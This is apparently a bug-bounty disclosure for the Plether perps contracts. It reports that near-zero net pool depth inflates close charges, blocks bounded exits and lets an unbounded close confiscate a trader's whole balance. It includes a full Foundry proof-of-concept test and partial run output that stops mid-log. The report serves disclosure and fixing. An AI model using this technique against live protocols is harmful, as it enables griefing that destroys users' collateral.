# \#99114 [SC-High] # An 8+ Order-of-Magnitude Discontinuity in `CloseAccountingLib.buildCloseState` When `0 < netDepthAssets << skew` Blocks All Protective Exits and Confiscates 100% of Remaining Balance

**Submitted on Nov 11th 2026 at 23:33:28 UTC by @dikanevn for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99114
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Introduction

- **Protocol / Repo / Commit:** Plether / `https://github.com/immunefi-team/audit-comp-plether` (`a82d4fefb02768e5b3bddcc97dee371eee24fea8`)
- **Asset (In Scope):** `packages/perps/src/libraries/CloseAccountingLib.sol`, `packages/perps/src/libraries/CfdEnginePlanLib.sol`, `packages/perps/src/CfdOrderPolicyEvaluatorBase.sol`, `packages/perps/src/CfdMath.sol`
- **Severity:** `Medium`
- **Impact (Immunefi Scope):** `Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)`
- **Vulnerable Lines:** `CloseAccountingLib.sol:105-111`, `CfdEnginePlanLib.sol:882-885, 1046-1134, 1339-1341`, `CfdOrderPolicyEvaluatorBase.sol:510-513`, `CfdMath.sol:123-139`

## Summary

In `CloseAccountingLib.buildCloseState`, the fresh VPI calculation is skipped only when `inputs.poolDepthAssets == 0` (`max(physicalAssets - totalTraderClaimBalanceAssets, 0)`). Although `WHITEPAPER.md:864-867` describes switching between `D == 0` and `D > 0`, the issue is not the curve at normal operating depth, but an 8+ order-of-magnitude discontinuity between the two documented regimes: `0` at `D = 0` and up to `21.36 trillion USDG` at `D = 1 atom` (`73.3M USDG` at `D = 0.29 USDG` — `645x` the entire physical pool). The stated goal that *"protective exits remain available"* holds only at the exact point `D = 0` and breaks across the entire right-hand neighborhood `0 < D << S`. Furthermore, `CfdOrderPolicyEvaluatorBase` checks the user's `maxActionChargeAssets` bound against the **assessed** charge rather than the **collected** charge: no reasonable `maxActionChargeAssets` (even up to `100%` of the account balance) allows a close to pass — the trader is forced either to remain trapped in the position or to authorize a cap of `>= 1943x` notional and forfeit 100% of their remaining margin and free settlement balance.

## Vulnerability Details

### Code Mechanism: `assessed` vs. `collected` and Liquidation Incentive Inversion

`CfdEnginePlanLib._buildCloseState` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1339-1341`) passes net economic depth `poolDepthAssets = max(physicalAssets - totalTraderClaimBalanceAssets, 0)` into `CloseAccountingLib.buildCloseState` (`packages/perps/src/libraries/CloseAccountingLib.sol:105-111`):

```solidity
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
```

When `0 < netDepth << skew`, the division `(skewWad * skewWad) / depthWad` in `CfdMath.tryGetSkewCost` (`packages/perps/src/CfdMath.sol:123-139`) pushes `vpiDeltaAssets` orders of magnitude above the position's notional value, causing three consequences:
1. **Partial close (`remainingSize > 0`):** whenever the charge cannot be collected in full (`delta.actionChargeWaivedAssets > 0`), `CfdEnginePlanLib._planValidatedClose` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:882-885`) unconditionally rejects the order with `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` (`PlannerRejected`).
2. **Bounded full close — checked against `assessed`, not `collected`:** `CfdEnginePlanLib.sol:1047` records the entire assessed VPI (`73.3M USDG`) into `delta.actionChargeAssessedAssets`, and `CfdOrderPolicyEvaluatorBase._enforceBounds` (`packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:510-513`) compares `bounds.maxActionChargeAssets` specifically against `assessment.actionChargeAssessedAssets`. As a result, **even a bound equal to 100% of the account's entire balance reverts with `ConstraintViolation(ActionCharge)`**. To exit, the user must set a cap `>= 1943x` of position notional — the choice is not "bounded vs. unbounded", but "stay trapped in the position or permit full confiscation of the remaining balance".
3. **Unbounded full close:** the `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` check is bypassed when `remainingSize == 0`, and `_planCloseCashSources` / `consumeActionCharge` (`CfdEnginePlanLib.sol:1046-1134`, `CfdEngineSettlementSidecar.sol:593-602`, `MarginClearinghouse.sol:595-612, 915-973`) drain into `HousePool` as `Revenue` the entire remaining balance after PnL and fees (`spendableActionReserve`, `freeSettlementAssets`, `unlockMarginAssets`, and the account's pending `committedOrderMarginAssets`).
4. **Liquidation incentive inversion (code observation):** per `WHITEPAPER.md:870-871`, `SECURITY.md:1436`, and `CfdEnginePlanLib.sol:1554-1562`, liquidation **computes no fresh VPI delta** (`actionChargeAssessedAssets = pendingCarry - realizedCarry + vpiClawback`), so in the `0 < netDepth << skew` regime forced liquidation avoids the explosive VPI charge whereas a voluntary protective exit does not *(not demonstrated in the current PoC fixture because `VICTIM` holds excess margin of `30,000 USDG` against a maximum loss of `20,000 USDG` even at `CAP_PRICE = 2.00`)*.

### This Is an Entire Region, Not a 29-Cent Edge Point

For `VICTIM`'s position (`20,000` LONG, notional `37,732 USDG`, `preSkew = 37,732`, `postSkew = 75,464`, `vpiFactor = 0.01`, physical pool `113,735 USDG`), the VPI charge equals `21,355,557.36 / D`:

| `netDepth`, USDG | `action charge`, USDG | Multiple of notional (`37,732`) | Regime |
| :--- | :--- | :--- | :--- |
| `0` | `0` | `0x` | Special branch `D == 0` (PoC control #2) |
| `0.000001` (1 atom) | `21,355,557,360,000` | `~566,000,000x` | Discontinuity maximum (without overflow) |
| `0.291311` | `73,308,448.22` | `1,943x` (`645x` pool) | PoC point 1 |
| `900.291311` | `23,720.72` | `0.63x` | PoC point 2 (`5,000` cap fails on `ActionCharge`) |
| `~662` | `~32,259` | `0.85x` | Full account wipeout threshold (`< 0.58%` of pool, `~7` lots) |
| `~4,271` | `~5,000` | `0.13x` | `5,000` cap rejection threshold (`< 3.76%` of pool, `~48` lots) |
| `113,735` (no claims) | `~188` | `0.005x` | Estimate at full pool without claims |
| `227,765.90` | `93.76` | `0.0025x` | Measured healthy baseline (PoC control #1, `5,000` cap passes) |

A `100`-token size lot at price `1.8866` produces `88.66 USDG` loss per lot — the full-wipeout window spans `~7` lots, and the `5,000 USDG` cap-rejection window spans `~48` lots (`3.76%` of the pool).

### Attacker Model and Zero Marginal Trigger Cost

- **Reaching `netDepth == 0`:** fresh gain payouts (`CashPriorityLib.reserveFreshPayouts`, `CashPriorityLib.sol:27-67`) do not reserve `settlementBuffer` or open-position limits, so profitable closes during Pyth volatility exhaust free cash and create `traderClaims`. A single attacker does not control oracle prices and does not need to create this phase alone.
- **Zero-VPI trigger (`netDepth == 0` -> `0 < netDepth << skew`):** a malicious attacker is not even required — any ordinary trader routinely closing a losing position or paying fees exceeding the current shortfall `traderClaims - pool.totalAssets()` moves the pool into `0 < netDepth << skew`. At the moment of Step 3, `netDepth` is still `0`, so **the initiator (`TOPPING_LOSER`) pays `0` VPI** (`triggerPreview.vpiDeltaAssets == 0` in the PoC): their `17,732 USDG` is purely normal price PnL (with a shortfall of a few dollars, a micro-position would suffice). The marginal VPI cost of triggering the effect is zero, while the burden is shifted onto subsequent traders exiting from the lighter side.

## Impact Assessment

**Medium (`Griefing`)**.

The PoC proves that the `0 < netDepth << skew` region is reachable and demonstrates its immediate consequences, but it does not prove forced persistence of the state for `1+` or `24+` hours: the duration of this window on a live network is **unknown** and depends on subsequent losses/liquidations, LP epoch settlement (`LP_EPOCH_DURATION = 1 hours`, though when `deficit != 0` or `oracleFrozen` deposits are blocked in `HousePool._entryStatusBlocked`), and unbounded closes themselves, which do execute (`LifecycleStatus.Executed`). Therefore, `High` is not claimed.

Regardless of duration, **Medium (`Griefing`)** is justified because:
1. The trigger requires no privileges, costs `0` extra VPI for the initiator, and can occur either with a small claim shortfall or naturally via a normal losing trade.
2. Affected traders are deprived of any bounded exit for an unknown duration: partial closes are rejected by the engine (`PlannerRejected`), and full closes with any reasonable `maxActionChargeAssets` cap — up to `100%` of the account balance — are rejected by the policy evaluator strictly on `ConstraintKind.ActionCharge`, leaving the position exposed to price and carry risk.
3. Exiting with a threshold `>= 1943x` of notional (or via an unbounded market close / pre-committed stop-loss) directly confiscates the entire remaining collateral beyond normal price loss and close fees (`32,235.183394 USDG` net excess loss in the PoC on top of `17,732.000000 USDG` realized price loss and `15.092800 USDG` execution fee at `4 bps`), which rules out `Low`.

## Why This Is Valid and Not a Known Issue

All affected contracts are in scope under `packages/perps/src/`. `packages/perps/SECURITY.md:1434-1444` and `packages/perps/test/perps/accounting/NetEconomicDepth.t.sol:236-271` only address the exact point `netDepth == 0`. `WHITEPAPER.md:864-867` merely notes the formula branch between `D > 0` and `D == 0`, without documenting the 8+ order-of-magnitude singularity in `0 < D << S`, charges reaching `645x` of the entire physical pool, or the rejection of even `100%`-balance limits due to checking `actionChargeAssessedAssets`.

## Remediation

**Do not modify `CfdMath.tryGetSkewCost`:** this primitive is shared and called by `OpenAccountingLib.sol:127`, `CfdEngineOpenQuoter.sol:375`, and `CloseAccountingLib.sol:108`. Adding a depth floor inside `CfdMath` would distort opening/quoting prices and effectively allow new opens at `netDepth == 0`, contradicting the specification.

**Localize the fix strictly in `CloseAccountingLib.buildCloseState`** (`EngineLens` previews, execution, and `CfdOrderPolicyEvaluatorBase` all flow through the same planner, so consistency is preserved automatically):
1. For a fresh positive close charge (`state.vpiDeltaAssets > 0`), introduce a continuous floor on the depth denominator tied to open risk scale (e.g., a fraction of `max(preSkewAssets, postSkewAssets)` / open interest), or cap positive `vpiDeltaAssets` at a fraction of `notionalAssets` (`CloseAccountingLib.sol:120`), keeping the curve monotonic and commensurate with the closed position.
2. Leave negative VPI rebates unchanged and preserve the existing lifetime clamp (`state.proportionalAccrualAssets + state.vpiDeltaAssets >= 0`).

---

## Proof of Concept

## Proof of Concept

### What the PoC Proves (`NearZeroNetDepthVpiPoC.t.sol`)

Four tests against the real `BasePerpTest` contracts (external mocks only for `MockPyth` and `MockSettlementToken`); in all bounded closes, `maxGrossAccountDebitAssets = type(uint256).max` to isolate `ActionCharge` as the sole binding constraint (since `grossAccountDebitAssets` includes the `17,732 USDG` realized price loss):
1. `test_Control_HealthyPoolDepth_NormalVpiClose` (differential control) — at healthy pool depth (`netDepth = 227,765.903323 USDG`), closing `20,000` LONG at `1.8866` assesses `93.760993 USDG` VPI, **passes with the exact same `maxActionChargeAssets = 5,000 USDG` cap** (`LifecycleStatus.Executed`), and leaves `32,141.422398 USDG`.
2. `test_Control_ZeroNetDepth_ProtectiveCloseSucceedsWithoutVpi` — at `netDepth == 0` at the same price, VPI is `0`, and `VICTIM` retains `32,235.183394 USDG`.
3. `test_PoC_ModerateNearZeroRegion_BlocksAt900UsdgDepth` — at `netDepth = 900.291311 USDG`, VPI is `23,720.719170 USDG`; the same `maxActionChargeAssets = 5,000 USDG` bound fails strictly on `ConstraintKind.ActionCharge` (`assessCommittedOrder` + `ConstraintViolation`).
4. `test_PoC_NearZeroNetDepth_VpiExplosion_BlocksAndConfiscates` — at `netDepth = 0.291311 USDG` (`pool = 113,735.332697`, `claims = 113,735.041386`):
   - the trigger `TOPPING_LOSER` itself executes at `netDepth == 0` and pays `0` VPI;
   - `VICTIM` is assessed `vpiDeltaAssets = 73,308,448.222003 USDG`;
   - a partial close (`10,000` LONG) fails with `PartialActionChargeUncollectible` / `PlannerRejected`;
   - a full close fails strictly on `ConstraintKind.ActionCharge` both with a `5,000 USDG` bound and with a bound equal to **`100%` of balance (`49,982.276194 USDG`)**;
   - an unbounded close drains the balance from `49,982.276194 USDG` (after `17.723806 USDG` in opening costs from the initial `50,000 USDG`: open VPI, `8.00` open fee, and bounty) down to `0`, where `17,732.000000 USDG` is realized price loss and `15.092800 USDG` is the execution fee (`4 bps` of `37,732 USDG`, `VICTIM` carry is `0`), leaving **`32,235.183394 USDG`** as pure excess confiscation caused by the explosive VPI `action charge`.

### Reproduction Instructions from Scratch

#### 1. Clone the repository and check out the in-scope commit

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

#### 2. Create the PoC test file

```bash
mkdir -p packages/perps/test/perps/poc
cat << 'EOF' > packages/perps/test/perps/poc/NearZeroNetDepthVpiPoC.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";
import {PositionRiskAccountingLib} from "@plether/perps/libraries/PositionRiskAccountingLib.sol";

contract NearZeroNetDepthVpiPoC is BasePerpTest {
    address internal constant LONG_WINNER = address(0xA101);
    address internal constant SHORT_WINNER = address(0xA102);
    address internal constant TOPPING_LOSER = address(0xA103);
    address internal constant SHORT_HEDGE = address(0xA104);
    address internal constant VICTIM = address(0xBEEF);
    address internal constant KEEPER = address(0xC001);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        // Total initial pool = 1,000 + 1,000 (seeds) + 208,000 = 210,000 USDG
        return 208_000e6;
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 price,
        bool isClose
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, sizeDelta, marginDelta, 0, isClose);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "trade must execute");
    }

    function _setupBalancedToClaimShortfall() internal {
        _fundTrader(LONG_WINNER, 150_000e6);
        _fundTrader(SHORT_WINNER, 150_000e6);
        _fundTrader(TOPPING_LOSER, 50_000e6);
        _fundTrader(SHORT_HEDGE, 100_000e6);
        _fundTrader(VICTIM, 50_000e6);

        // Open balanced positions at $1.00 (staying within maxSkewRatio = 0.4 on each step, final skew = 0)
        _trade(LONG_WINNER, CfdTypes.Side.LONG, 60_000e18, 60_000e6, 1e8, false);
        _trade(SHORT_WINNER, CfdTypes.Side.SHORT, 60_000e18, 60_000e6, 1e8, false);
        _trade(LONG_WINNER, CfdTypes.Side.LONG, 60_000e18, 60_000e6, 1e8, false);
        _trade(SHORT_WINNER, CfdTypes.Side.SHORT, 60_000e18, 60_000e6, 1e8, false);

        _trade(VICTIM, CfdTypes.Side.LONG, 20_000e18, 30_000e6, 1e8, false);
        _trade(TOPPING_LOSER, CfdTypes.Side.LONG, 20_000e18, 30_000e6, 1e8, false);
        _trade(SHORT_HEDGE, CfdTypes.Side.SHORT, 40_000e18, 80_000e6, 1e8, false);

        // Step 1: Price drops to $0.05 -> LONG_WINNER closes and drains ~$114k cash
        _trade(LONG_WINNER, CfdTypes.Side.LONG, 120_000e18, 0, 5_000_000, true);

        // Step 2: Price rises to $1.95 -> SHORT_WINNER closes with ~$114k gain > remaining pool cash -> claim created
        _trade(SHORT_WINNER, CfdTypes.Side.SHORT, 120_000e18, 0, 1.95e8, true);
        assertGt(engine.totalTraderClaimBalanceAssets(), pool.totalAssets(), "netDepth must start at 0");
    }

    function test_Control_ZeroNetDepth_ProtectiveCloseSucceedsWithoutVpi() public {
        _setupBalancedToClaimShortfall();
        uint256 price = 188_660_000;

        // With netDepth == 0, CloseAccountingLib skips fresh VPI so VICTIM exits cleanly
        uint256 netDepth = PositionRiskAccountingLib.computeNetPoolDepthAssets(
            pool.totalAssets(), engine.totalTraderClaimBalanceAssets()
        );
        assertEq(netDepth, 0);

        ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, 20_000e18, price);
        assertTrue(preview.valid, "zero-depth close is valid");
        assertEq(preview.vpiDeltaAssets, 0, "zero-depth close charges zero fresh VPI");

        uint256 victimBalBefore = clearinghouse.balanceAssets(VICTIM);
        _trade(VICTIM, CfdTypes.Side.LONG, 20_000e18, 0, price, true);
        uint256 victimBalAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_uint("Control (netDepth=0) VICTIM balance after close", victimBalAfter);
        assertGt(victimBalAfter, 30_000e6, "VICTIM retains margin and free settlement");
        assertLt(victimBalAfter, victimBalBefore);
    }

    function test_Control_HealthyPoolDepth_NormalVpiClose() public {
        _fundTrader(TOPPING_LOSER, 50_000e6);
        _fundTrader(SHORT_HEDGE, 100_000e6);
        _fundTrader(VICTIM, 50_000e6);

        _trade(VICTIM, CfdTypes.Side.LONG, 20_000e18, 30_000e6, 1e8, false);
        _trade(TOPPING_LOSER, CfdTypes.Side.LONG, 20_000e18, 30_000e6, 1e8, false);
        _trade(SHORT_HEDGE, CfdTypes.Side.SHORT, 40_000e18, 80_000e6, 1e8, false);

        uint256 price = 188_660_000;
        _trade(TOPPING_LOSER, CfdTypes.Side.LONG, 20_000e18, 0, price, true);

        uint256 netDepth = PositionRiskAccountingLib.computeNetPoolDepthAssets(
            pool.totalAssets(), engine.totalTraderClaimBalanceAssets()
        );
        emit log_named_uint("Healthy pool netDepthAssets", netDepth);
        assertGt(netDepth, 200_000e6, "healthy depth > 200k USDG");

        ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, 20_000e18, price);
        emit log_named_int("Healthy pool VICTIM vpiDeltaAssets", preview.vpiDeltaAssets);
        assertTrue(preview.valid, "healthy close is valid");
        assertLt(preview.vpiDeltaAssets, 200e6, "healthy close VPI is under 200 USDG");

        // Differential control: identical ActionCharge bound (5,000 USDG) passes at healthy depth
        OrderV3Types.OrderRequest memory healthyBoundedClose = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(9990)),
            side: CfdTypes.Side.LONG,
            sizeDelta: 20_000e18,
            marginDelta: 0,
            targetPrice: type(uint256).max,
            isClose: true,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + 60,
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 100e6,
                maxExecutionNotionalAssets: 100_000e6,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: 5_000e6,
                maxExplicitFeesAssets: 1_000e6,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(VICTIM);
        uint64 healthyBoundedId = router.commitOrder(healthyBoundedClose);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory healthyRes =
            router.executeOrder(healthyBoundedId, _mockPythUpdateData(price));
        assertEq(
            uint8(healthyRes.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "same 5k ActionCharge bound passes at healthy depth"
        );
        uint256 victimBalAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_uint("Control (healthy depth) VICTIM balance after close", victimBalAfter);
        assertGt(victimBalAfter, 32_000e6, "VICTIM retains > 32k USDG");
    }

    function test_PoC_NearZeroNetDepth_VpiExplosion_BlocksAndConfiscates() public {
        _setupBalancedToClaimShortfall();
        uint256 price = 188_660_000;

        // Trigger itself executes at netDepth == 0 and pays zero fresh VPI
        ICfdEngineTypes.ClosePreview memory triggerPreview = engineLens.previewClose(TOPPING_LOSER, 20_000e18, price);
        assertEq(triggerPreview.vpiDeltaAssets, 0, "trigger close pays zero fresh VPI");

        // Step 3: TOPPING_LOSER closes at loss bringing pool.totalAssets() just above traderClaims (0 < netDepth ~ 0.29 USDG)
        _trade(TOPPING_LOSER, CfdTypes.Side.LONG, 20_000e18, 0, price, true);

        uint256 assetsAfter = pool.totalAssets();
        uint256 claimsAfter = engine.totalTraderClaimBalanceAssets();
        uint256 netDepth = PositionRiskAccountingLib.computeNetPoolDepthAssets(assetsAfter, claimsAfter);
        emit log_named_uint("pool.totalAssets()", assetsAfter);
        emit log_named_uint("totalTraderClaimBalanceAssets()", claimsAfter);
        emit log_named_uint("netDepthAssets", netDepth);
        assertGt(netDepth, 0, "netDepth must be > 0");
        assertLt(netDepth, 10e6, "netDepth is positive but near zero");

        // Preview close at the same price
        ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, 20_000e18, price);
        emit log_named_int("VICTIM full close vpiDeltaAssets", preview.vpiDeltaAssets);
        assertGt(preview.vpiDeltaAssets, 1_000_000e6, "VPI charge explodes > 1M USDG");

        // 1. Partial close fails inside engine with PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE (even with unbounded limits)
        ICfdEngineTypes.ClosePreview memory partialPreview = engineLens.previewClose(VICTIM, 10_000e18, price);
        assertFalse(partialPreview.valid, "partial close must fail");
        assertEq(
            uint256(partialPreview.invalidReason),
            uint256(CfdTypes.CloseInvalidReason.PartialActionChargeUncollectible),
            "partial close blocked by uncollectible VPI"
        );
        vm.prank(VICTIM);
        uint64 partialId = router.commitOrder(CfdTypes.Side.LONG, 10_000e18, 0, 0, true);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory partialRes = router.executeOrder(partialId, _mockPythUpdateData(price));
        assertEq(uint8(partialRes.status), uint8(OrderV3Types.LifecycleStatus.Failed), "partial close order must fail");
        assertEq(
            uint8(partialRes.terminalReason),
            uint8(OrderV3Types.TerminalReason.PlannerRejected),
            "partial close rejected by engine planner"
        );

        // 2. Bounded V3 full close with realistic maxActionChargeAssets = 5,000 USDG fails specifically on ActionCharge
        OrderV3Types.OrderRequest memory boundedClose = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(9991)),
            side: CfdTypes.Side.LONG,
            sizeDelta: 20_000e18,
            marginDelta: 0,
            targetPrice: type(uint256).max,
            isClose: true,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + 60,
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 100e6,
                maxExecutionNotionalAssets: 100_000e6,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: 5_000e6,
                maxExplicitFeesAssets: 1_000e6,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(VICTIM);
        uint64 boundedId = router.commitOrder(boundedClose);
        ICfdOrderPolicyEvaluator evaluator = ICfdOrderPolicyEvaluator(router.policyEvaluator());
        uint256 expectedAssessed = uint256(preview.vpiDeltaAssets) + preview.executionFeeAssets;
        vm.expectRevert(
            abi.encodeWithSelector(
                ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
                OrderV3Types.ConstraintKind.ActionCharge,
                expectedAssessed,
                5_000e6
            )
        );
        evaluator.assessCommittedOrder(address(engine), boundedId, KEEPER, price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory boundedRes = router.executeOrder(boundedId, _mockPythUpdateData(price));
        assertEq(uint8(boundedRes.status), uint8(OrderV3Types.LifecycleStatus.Failed), "bounded close must fail");
        assertEq(
            uint8(boundedRes.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "bounded close rejected by ConstraintViolation"
        );

        // 3. Bounded close even with maxActionChargeAssets == 100% of VICTIM balance fails on ActionCharge (ASSESSED vs collected)
        uint256 victimBalBefore = clearinghouse.balanceAssets(VICTIM);
        OrderV3Types.OrderRequest memory fullBalanceBoundClose = boundedClose;
        fullBalanceBoundClose.clientOrderId = bytes32(uint256(9993));
        fullBalanceBoundClose.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        fullBalanceBoundClose.bounds.maxActionChargeAssets = victimBalBefore;
        vm.prank(VICTIM);
        uint64 fullBoundId = router.commitOrder(fullBalanceBoundClose);
        vm.expectRevert(
            abi.encodeWithSelector(
                ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
                OrderV3Types.ConstraintKind.ActionCharge,
                expectedAssessed,
                victimBalBefore
            )
        );
        evaluator.assessCommittedOrder(address(engine), fullBoundId, KEEPER, price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory fullBoundRes = router.executeOrder(fullBoundId, _mockPythUpdateData(price));
        assertEq(uint8(fullBoundRes.status), uint8(OrderV3Types.LifecycleStatus.Failed), "100% balance cap must still fail");
        assertEq(
            uint8(fullBoundRes.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "evaluator checks full assessed VPI, not collected"
        );

        // 4. Unbounded V3 full close (e.g. market close / high limit) drains 100% of remaining collateral
        emit log_named_uint("VICTIM balance before unbounded close", victimBalBefore);

        OrderV3Types.OrderRequest memory unboundedClose = boundedClose;
        unboundedClose.clientOrderId = bytes32(uint256(9992));
        unboundedClose.bounds.submitBy = uint64(block.timestamp) + 60;
        unboundedClose.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        unboundedClose.bounds.maxActionChargeAssets = type(uint256).max;

        vm.prank(VICTIM);
        uint64 unboundedId = router.commitOrder(unboundedClose);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory unboundedRes = router.executeOrder(unboundedId, _mockPythUpdateData(price));
        assertEq(uint8(unboundedRes.status), uint8(OrderV3Types.LifecycleStatus.Executed), "unbounded close executes");

        uint256 victimBalAfter = clearinghouse.balanceAssets(VICTIM);
        emit log_named_uint("VICTIM balance after unbounded close", victimBalAfter);
        assertEq(victimBalAfter, 0, "100% of VICTIM remaining margin and free settlement confiscated");
    }

    function test_PoC_ModerateNearZeroRegion_BlocksAt900UsdgDepth() public {
        _setupBalancedToClaimShortfall();
        uint256 triggerPrice = 193_160_000; // +0.045 * 20,000 = ~900 USDG above 0.29 USDG threshold
        uint256 closePrice = 188_660_000;

        _trade(TOPPING_LOSER, CfdTypes.Side.LONG, 20_000e18, 0, triggerPrice, true);

        uint256 netDepth = PositionRiskAccountingLib.computeNetPoolDepthAssets(
            pool.totalAssets(), engine.totalTraderClaimBalanceAssets()
        );
        emit log_named_uint("Moderate region netDepthAssets", netDepth);
        assertGt(netDepth, 800e6, "netDepth > 800 USDG");
        assertLt(netDepth, 1_100e6, "netDepth < 1100 USDG");

        ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, 20_000e18, closePrice);
        emit log_named_int("Moderate region VICTIM vpiDeltaAssets", preview.vpiDeltaAssets);
        assertGt(preview.vpiDeltaAssets, 20_000e6, "VPI remains > 20,000 USDG even at ~900 USDG depth");

        OrderV3Types.OrderRequest memory boundedClose = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(9994)),
            side: CfdTypes.Side.LONG,
            sizeDelta: 20_000e18,
            marginDelta: 0,
            targetPrice: type(uint256).max,
            isClose: true,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp) + 60,
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 100e6,
                maxExecutionNotionalAssets: 100_000e6,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: 5_000e6,
                maxExplicitFeesAssets: 1_000e6,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(VICTIM);
        uint64 boundedId = router.commitOrder(boundedClose);
        ICfdOrderPolicyEvaluator evaluator = ICfdOrderPolicyEvaluator(router.policyEvaluator());
        uint256 expectedAssessed = uint256(preview.vpiDeltaAssets) + preview.executionFeeAssets;
        vm.expectRevert(
            abi.encodeWithSelector(
                ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector,
                OrderV3Types.ConstraintKind.ActionCharge,
                expectedAssessed,
                5_000e6
            )
        );
        evaluator.assessCommittedOrder(address(engine), boundedId, KEEPER, closePrice);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory boundedRes = router.executeOrder(boundedId, _mockPythUpdateData(closePrice));
        assertEq(uint8(boundedRes.status), uint8(OrderV3Types.LifecycleStatus.Failed), "5k cap still blocked at ~900 USDG depth");
        assertEq(
            uint8(boundedRes.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "blocked by ConstraintViolation across region"
        );
    }
}
EOF
```

#### 3. Run the test

```bash
cd packages/perps
forge test --match-contract NearZeroNetDepthVpiPoC -vv
```

### Confirmed Terminal Output

```text
Ran 4 tests for test/perps/poc/NearZeroNetDepthVpiPoC.t.sol:NearZeroNetDepthVpiPoC
[PASS] test_Control_HealthyPoolDepth_NormalVpiClose() (gas: 14590440)
Logs:
  Healthy pool netDepthAssets: 227765903323
  Healthy pool VICTIM vpiDeltaAssets: 93760993
  Control (healthy depth) VICTIM balance after close: 32141422398

[PASS] test_Control_ZeroNetDepth_ProtectiveCloseSucceedsWithoutVpi() (gas: 29501431)
Logs:
